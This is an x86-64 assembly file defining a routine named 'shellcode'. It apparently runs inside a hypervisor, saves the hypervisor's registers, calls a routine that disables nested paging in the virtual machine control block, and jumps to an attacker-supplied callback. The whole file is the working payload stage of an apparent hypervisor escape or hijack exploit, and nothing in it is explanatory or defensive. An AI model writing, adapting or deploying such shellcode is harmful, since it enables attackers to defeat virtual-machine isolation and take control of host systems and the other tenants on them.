.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

// page+0x000 - code
// page+0x400 - scratch area
// page+0xf00 - stack (grows downward toward page+0x400)
// page+0xf00 - params

shellcode:
    lea     rsp, [rip + 0xef9]          // rsp = params (0 + 7 + 0xef9 = 0xf00)
    push    rbx                         // save HV rbx
    push    rsi                         // save HV rsi
    push    rdi                         // save core idx
    sub     rsp, 8                      // realign to 16-byte boundary
    lea     rbx, [rsp + 0x20]
    mov     rdi, rbx                    // arg0 = params
    call    vmcb_disable_np
    mov     rcx, qword ptr [rbx]        // init_cb = param[0]
    add     rsp, 8
    pop     rdi                         // restore core index
    pop     rsi
    pop     rbx
    jmp     rcx                         // jump to init_cb
.size shellcode, .-shellcode
